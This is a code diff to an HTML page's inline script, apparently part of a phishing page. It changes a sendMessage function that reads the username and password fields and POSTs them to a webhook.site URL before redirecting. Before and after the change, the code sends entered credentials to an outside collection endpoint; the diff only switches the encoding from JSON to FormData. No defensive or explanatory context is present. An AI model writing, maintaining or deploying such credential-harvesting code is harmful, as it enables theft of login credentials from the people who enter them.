@@ -89,20 +89,14 @@
   </script>
 
   <script>
-  function sendMessage() {
-  var params = {
-    content: (
-      "> **USERNAME  : **" + document.getElementById('username').value +
-      "\n> **PASSWORD : **" + document.getElementById('password').value
-    )
-  };
+function sendMessage() {
+  var formData = new FormData();
+  formData.append("username", document.getElementById('username').value);
+  formData.append("password", document.getElementById('password').value);
 
   fetch("https://webhook.site/d5870087-0da4-4400-af6a-4435c84bbb64", {
     method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify(params)
+    body: formData
   }).then(() => {
     // Delay before redirecting
     setTimeout(() => {
